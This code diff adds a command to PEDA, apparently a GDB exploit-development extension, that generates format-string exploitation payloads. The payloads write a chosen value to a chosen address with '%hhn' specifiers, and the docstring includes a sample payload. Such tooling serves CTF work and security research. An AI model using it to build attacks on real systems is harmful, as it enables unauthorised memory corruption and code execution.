@@ -5998,6 +5998,42 @@ class PEDACmd(object):
         return
     utils.options = ["int2hexstr", "list2hexstr", "str2intlist"]
 
+    def fmtstringpayload(self, *arg):
+        """
+        Create payload for format string bug exploitation
+        You can specify what write, where write, the number of your formater and the number of chars already print.
+        USAGE:
+            MYNAME what where format_number
+            MYNAME what where format_number already_print
+        EXAMPLE:
+            gdb-peda$ MYNAME 0x1337babe 0x08048425 7
+            [+] Your payload : "%\\x84\\x04\\x08&\\x84\\x04\\x08'\\x84\\x04\\x08(\\x84\\x04\\x08%174c%7$hhn%252c%8$hhn%125c%9$hhn%220c%10$hhn"
+        """
+        (what, where, format_number, already_print) = normalize_argv(arg, 4)
+        if None in [what, where, format_number]:
+            msg(red("[-]") + " Please specify at least : what, where and format_number")
+            return
+
+        if already_print is None:
+            already_print = 0
+
+        payload = "".join(struct.pack('<I', where+i) for i in range(4))
+        total = len(payload) + already_print
+        for i in range(4):
+            to_add = 0
+            while (total + to_add) & 0xff != what & 0xff:
+                to_add += 1
+            total += to_add
+
+            if to_add != 0:
+                payload += "%" + str(to_add) + "c" + "%" + str(format_number+i) + "$hhn"
+            else:
+                payload += "%" + str(format_number+i) + "$hhn"
+
+            what >>= 0x8
+
+        msg(green("[+]") + " Your payload : %r" % payload)
+
 ###########################################################################
 class pedaGDBCommand(gdb.Command):
     """
